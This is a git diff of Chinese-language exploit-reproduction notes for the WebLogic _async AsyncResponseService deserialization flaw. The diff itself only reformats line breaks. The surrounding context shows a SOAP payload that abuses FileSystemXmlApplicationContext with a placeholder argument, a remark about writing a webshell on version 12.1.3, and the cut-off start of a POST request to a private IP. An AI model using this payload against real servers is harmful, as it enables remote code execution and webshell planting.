@@ -88,7 +88,8 @@ content-type: text/xml
 
 <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><class><string>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</string><void><string>xx</string></void></class></java>    </work:WorkContext>   </soapenv:Header>   <soapenv:Body>      <asy:onAsyncDelivery/>   </soapenv:Body></soapenv:Envelope>
 ```
-4、12.1.3版本测试写入shell,有个路径问题,写入bea_wls_internal路径中。bea_wls9_async_response写不进去,没有细看回头研究。
+4、12.1.3版本测试写入shell</br>
+有个路径问题,写入bea_wls_internal路径中。bea_wls9_async_response写不进去,没有细看回头研究。</br>
 ```
 POST /_async/AsyncResponseService HTTP/1.1
 Host: 192.168.86.251:7001
